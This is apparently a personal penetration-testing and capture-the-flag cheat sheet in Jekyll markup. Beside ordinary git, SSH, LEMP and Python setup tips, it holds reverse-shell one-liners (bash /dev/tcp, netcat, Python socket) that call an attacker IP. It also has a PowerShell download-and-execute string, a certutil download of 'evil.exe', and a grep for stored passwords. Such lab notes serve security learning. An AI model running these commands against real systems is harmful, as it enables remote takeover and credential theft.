---
layout: tips
title: Tips and Tricks
---
Upgrading Simple Shells to Fully Interactive TTYs
=================================================
{% highlight python%}
python -c 'import pty; pty.spawn("/bin/bash")'
or
python3 -c 'import pty; pty.spawn("/bin/bash")'
{% endhighlight %}

Then press CTRL+Z to return to your local shell

{% highlight bash%}
stty -a or (stty size)
stty raw -echo
{% endhighlight %}

Note the number of rows and columns before pressing fg to return to the box

{% highlight bash%}
export SHELL=bash
export TERM=xterm256-color
stty rows number_of_row columns number_of_columns
{% endhighlight %}
rlwrap can be used too
[Back to the top](#header)

SSH
=============================
Creating keys
{% highlight bash%}
ssh-keygen -t rsa -P '' -f ~/.ssh/id_rsa
cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys
chmod 0600 ~/.ssh/authorized_keys
{% endhighlight %}
[Back to the top](#header)

Git
=============================
Creating new git
{% highlight bash%}
$ git init
$ git add .
# Adds the files in the local repository and stages them for commit. To unstage a file, use 'git reset HEAD YOUR-FILE'.
$ git commit -m "First commit"
# Commits the tracked changes and prepares them to be pushed to a remote repository. To remove this commit and modify the file, use 'git reset --soft HEAD~1' and commit and add the file again.
$ git remote add origin remote repository URL
# Sets the new remote
$ git remote -v
# Verifies the new remote URL
$ git push origin master
# Pushes the changes in your local repository up to the remote repository you specified as the origin
{% endhighlight %}
[Back to the top](#header)

Finding interesting locations
=============================
{% highlight bash%}
Writable files directories
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null
find / -perm -o w -type d 2>/dev/null
Executable folder
find / -perm -o x -type d 2>/dev/null
Writable and executable folders
find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
By default on Linux:
/tmp
/tmp
/var/tmp
/dev/shm
/var/spool/vbox
/var/spool/samba
By default on Windows:
C:\Windows\Tasks 
C:\Windows\Temp 
C:\windows\tracing
C:\Windows\Registration\CRMLog
C:\Windows\System32\FxsTmp
C:\Windows\System32\com\dmp
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\PRINTERS
C:\Windows\System32\spool\SERVERS
C:\Windows\System32\spool\drivers\color
C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter
C:\Windows\System32\Tasks_Migrated (after peforming a version upgrade of Windows 10)
C:\Windows\SysWOW64\FxsTmp
C:\Windows\SysWOW64\com\dmp
C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter
C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System
{% endhighlight %}
[Back to the top](#header)

Convert to UTF-16LE
===================
{% highlight bash%}
root@kali:~# echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.1/shell.ps1')" | xxd | head -3
00000000: 4945 5828 4e65 772d 4f62 6a65 6374 204e  IEX(New-Object N
00000010: 6574 2e57 6562 436c 6965 6e74 292e 646f  et.WebClient).do
00000020: 776e 6c6f 6164 5374 7269 6e67 2827 6874  wnloadString('ht
root@kali:~# echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.1/shell.ps1')" | iconv -t UTF-16LE | xxd | head -3
00000000: 4900 4500 5800 2800 4e00 6500 7700 2d00  I.E.X.(.N.e.w.-.
00000010: 4f00 6200 6a00 6500 6300 7400 2000 4e00  O.b.j.e.c.t. .N.
00000020: 6500 7400 2e00 5700 6500 6200 4300 6c00  e.t...W.e.b.C.l.
{% endhighlight %}
[Back to the top](#header)

Setting up SMB server
=====================
{% highlight bash%}
root@kali:~/HTB/Json/smb# smbserver.py -username root -password password sharingiscaring $(pwd) -smb2support
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
{% endhighlight %}

On the windows side:
{% highlight bash%}
$pass= “password” | ConverTo-SecureString -AsPlainText -Force #need to be typed
$pass #to verify it is created
$cred = New-Object System.Management.Automation.PsCredential('root',$pass)
$cred #to verify it is created
New-PSDrive -name share -root \\10.10.14.1\sharingiscaring -Credential $cred -PSProvider "filesystem"
cd share:
.\winPEAS.exe cmd fast > winPEAS.exe
{% endhighlight %}
[Back to the top](#header)

One Liners
==========
Dowloading file via certutil
{% highlight bash%}
cmd.exe /C certutil  -split -urlcache -f http://10.10.14.1/evil.exe c:\Users\Admin\Desktop\notevil.exe
{% endhighlight %}
Nmap scan ran through searchsploit
{% highlight bash%}
nmap -p- -sV -oX new.xml 10.10.14.1; searchsploit --nmap new.xml
{% endhighlight %}
List al started services
{% highlight bash%}
cmd.exe /c wmic service where started=true get name, startname
{% endhighlight %}
Wfuzz
{% highlight bash%}
wfuzz -w /wordlist/directory-medium.txt --hc 404 http://testing.com/test.php?FUZZ=1
--hc 404 = exclude 404 response  
--hh 777 = exclude response with 777char  
For more details: [wfuzz][link15] 
{% endhighlight %}
Find all file in a directory and executing a command.
{% highlight bash%}
find . -type f -exec cat {} \;
{% endhighlight %}
Easy transfert
{% highlight bash%}
base64 -w 0 filetotransfert
echo "iOgogIG1haW4oKQo=" | base64 -d > filename
{% endhighlight %}
Looking for creds in the directory
{% highlight bash%}
Grabbing full word
grep -rnw ./ -e 'password' -e 'password' -e 'passwd'
Grabbing partial word
grep -rn ./ -e 'passwd'
{% endhighlight %}
Search for flag
{% highlight bash%}
find / -type f \( -name "root.txt" -o -name "user.txt" \) 2>/dev/nul
{% endhighlight %}
Untar
{% highlight bash%}
tar -xvf
{% endhighlight %}
Removing password from ssh
{% highlight bash%}
openssl rsa -in ~/.ssh/id_rsa -out ~/.ssh/id_rsa_new
{% endhighlight %}
Finding interesting stuff in github rep:
{% highlight bash%}
{ find .git/objects/pack/ -name "*.idx"|while read i;do git show-index < "$i"|awk '{print $2}';done;find .git/objects/ -type f|grep -v '/pack/'|awk -F'/' '{print $(NF-1)$NF}'; }|while read o;do git cat-file -p $o;done|grep -E 'pattern'
{% endhighlight %}
[Back to the top](#header)

Reverse shells
================
{% highlight bash%}
bash -i >& /dev/tcp/10.10.14.1/9001 0>&1
/bin/sh | nc 10.10.14.1 9001
rm -f /tmp/p; mknod /tmp/p p && nc 10.10.14.1 9001 0/tmp/p
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.32",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
{% endhighlight %}
[Back to the top](#header)

Creating Custom Wordlists
=========================
This can be easily achieved using [exrex][link13]:
{% highlight bash%}
python3 exrex.py "(winter|summer|spring|fall|autumn)20[12][678]" -o wordlist
{% endhighlight %}
[Cewl][link14] can also be used to automaticly generate a wordlist by scrapping a website:
{% highlight bash%}
cewl -d 0 https://www.testing.com/
{% endhighlight %}
[Back to the top](#header)

Finding non standard binaries 
==============================
{% highlight bash%}
for i in $(ls /sbin/*); do echo $i; done
for i in $(ls /sbin/*); do dpkg --search $i; done
for i in $(ls /sbin/*); do dpkg --search $i 1>/dev/null; done
{% endhighlight %}
[Back to the top](#header)

Setting up LEMP stack 
==============================
Setting up nginx
-----------------
Simply install the package a choose a firewall profile. The working directory for the server will be /var/www/html.
{% highlight bash%}
sudo apt-get install nginx
sudo ufw status
sudo ufw enable
sudo ufw allow 'Nginx HTTP'
sudo ufw status
{% endhighlight %}

Setting up php-mysql
---------------------
Here after the installation process, a couple of files will need to be edited:
{% highlight bash%}
sudo apt-get install php-fpm php-mysql
sudo vim /etc/php/7.2/fpm/php.ini
	set cgi.fix_pathinfo=0
sudo systemctl restart php7.2-fpm
{% endhighlight %}
Configure Nginx to Use the PHP Processor
{% highlight bash%}
sudo vim /etc/nginx/sites-available/default

server {
    listen 80 default_server;
    listen [::]:80 default_server;
    root /var/www/html;
    index index.php index.html index.htm index.nginx-debian.html;
    server_name server_domain_or_IP;
    location / {
        try_files $uri $uri/ =404;
    }
    location ~ \.php$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/run/php/php7.2-fpm.sock;
    }
    location ~ /\.ht {
        deny all;
    }
}
sudo nginx -t #testing configuration
{% endhighlight %}
Testing the php processor
{% highlight bash%}
sudo vim /var/www/html/info.php

<?php
phpinfo();

localhost/info.php
{% endhighlight %}
[Back to the top](#header)

Select python version
=====================
{% highlight bash%}
update-alternatives --list python
update-alternatives --install /usr/bin/python python /usr/bin/python2.7 1
update-alternatives --install /usr/bin/python python /usr/bin/python3.6 2
update-alternatives --config python
{% endhighlight %}
[Back to the top](#header)

Testing scrips as www-data
=====================
{% highlight bash%}
su - www-data -s /bin/bash -c 'python /var/www/html/alerter.py'
{% endhighlight %}
Install missing packages as root to fix dependency
[Back to the top](#header)

Interesting Links:
==================
- [jwt.io][link1]: Decode and edit jwt token
- [cyberchef][link3]: Decode and encode in multiple format
- [stackedit.io][link4]: Markdown editor
- [devhints.io][link5]: Jekyll dev ops tricks
- [jekyllrb.com][link6]: Jekyll tuto
- [PayloadsAllTheThings][link7]: Payload for everything
- [Netsec][link8]: Idea for future tutorials
- [Pentestmonkey][link9]: Reverse Shell Cheat Sheet
- [W3schools][link10]: Testing new layout
- [Jekyll Tags][link12]: For future reference

[Back to the top](#header)

[link1]:https://jwt.io/  
[link2]:http://jekyllrb.com
[link3]:https://gchq.github.io/CyberChef/
[link4]:https://stackedit.io/app#
[link5]:https://devhints.io/jekyll 
[link6]:https://jekyllrb.com/
[link7]:https://github.com/swisskyrepo/PayloadsAllTheThings
[link8]:https://netsec.ws/?p=376
[link9]:http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
[link10]:https://www.w3schools.com/howto/tryit.asp?filename=tryhow_css_subnav
[link11]:https://github.com/infodox/python-pty-shells
[link12]:https://longqian.me/2017/02/09/github-jekyll-tag/
[link13]:https://github.com/asciimoo/exrex
[link14]:https://digi.ninja/projects/cewl.php
[link15]:https://wfuzz.readthedocs.io/en/latest/user/getting.html#getting-help
